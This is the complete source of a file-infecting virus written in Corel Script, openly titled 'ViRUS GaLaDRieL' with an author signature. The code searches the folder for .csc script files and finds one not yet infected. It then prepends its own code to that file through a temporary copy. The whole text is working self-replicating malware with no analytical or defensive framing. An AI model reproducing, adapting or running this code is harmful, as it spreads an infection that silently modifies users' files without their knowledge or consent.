   REM ViRUS GaLaDRieL FOR COREL SCRIPT bY zAxOn/DDT
   mynombre$=FindFirstFolder ("*.csc",32 or 128)
   Do while not mynombre$=""
   Open mynombre$ For Input As #1
   Palacios_Intemporales:
   Line Input #1,linea$
   If linea$="" then goto Palacios_Intemporales
   if victima_bool=1 Then Goto Esgaroth
   If Instr(linea$,"REM ViRUS",1)=0 then
   vic_tima$=mynombre$
   victima_bool=1
   End if
   Esgaroth:
   If Instr(linea$,"REM ViRUS",1)<> 0 Then
   yo_estoy_en$=mynombre$
   conocimiento=1
   End if
   Close
   If conocimiento=1 Then If victima_bool=1 Then Goto LothLorien
   mynombre$=FindNextFolder ()
   If mynombre$="" Then Goto Los_Puertos_Grises
   Loop
   LothLorien:
   Kill "mallorn.tmp"
   Rename vic_tima$,"mallorn.tmp",0
   Open yo_estoy_en$ For Input As #1
   open vic_tima$ For Output As #2
   Do While Not Left(linea$,7)="REM END"
   Line Input #1,linea$
   Print #2,linea$
   Loop
   Line Input #1,linea$
   Print #2,linea$
   Close
   Open vic_tima$ For Append As #1
   Open "mallorn.tmp" For Input As #2
   Do While Not Eof(2)
   Line Input #2,linea$
   Print #1,linea$
   Loop
   Close
   Kill "mallorn.tmp"
   Los_Puertos_Grises:
   REM END OF ViRUS GaLaDRieL bY zAxOn/DDT
